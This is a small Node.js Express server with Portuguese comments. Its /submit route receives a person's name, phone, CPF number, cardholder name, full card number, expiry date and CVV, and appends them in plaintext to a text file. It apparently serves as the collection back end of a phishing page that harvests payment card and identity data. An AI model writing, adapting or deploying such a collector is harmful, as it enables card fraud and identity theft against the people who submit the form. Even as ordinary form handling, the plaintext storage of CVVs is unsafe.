const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para lidar com dados do formulário
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Rota básica para evitar o erro "Cannot GET /"
app.get('/', (req, res) => {
  res.status(200).send('Servidor de recepção de dados está ativo.');
});

// Rota para receber os dados do formulário
app.post('/submit', (req, res) => {
  const { nome, telefone, cpf, nomeTitular, numeroCartao, dataValidade, cvv } = req.body;
  const data = `Nome: ${nome}, Telefone: ${telefone}, CPF: ${cpf}, Nome do Titular: ${nomeTitular}, Número do Cartão: ${numeroCartao}, Data de Validade: ${dataValidade}, CVV: ${cvv}\n`;

  // Salvar os dados em um arquivo txt
  fs.appendFile('dados.txt', data, (err) => {
    if (err) {
      console.error('Erro ao salvar os dados:', err);
      res.status(500).send('Erro ao salvar os dados.');
    } else {
      res.status(200).send('Dados recebidos e salvos com sucesso.');
    }
  });
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
